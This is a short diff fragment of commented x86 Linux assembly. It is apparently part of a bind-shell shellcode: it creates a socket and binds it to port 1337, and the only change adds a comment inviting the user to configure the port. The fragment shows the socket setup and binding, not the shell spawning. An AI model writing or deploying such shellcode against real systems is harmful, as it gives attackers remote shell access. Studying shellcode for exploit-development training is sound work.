@@ -17,7 +17,7 @@ int 0x80    ;Calling Interrupt for syscall
 xchg esi,eax;Saving sockdfd in esi 
 
 push edx          ;Pushing null on stack [EDX is already cleared in the begining using cdq] - [sockaddr.sin_addr.s_addr]
-push word 0x3905  ;Pushing port no. 1337 [
+push word 0x3905  ;Pushing port no. 1337 [Configure your Port here ] 
 inc ebx           ;[SYS_BIND 0x2]
 push bx           ;push 0x2 onto stack
 mov ecx,esp       ;save pointer to bind arguements i.e pointer to sockaddr
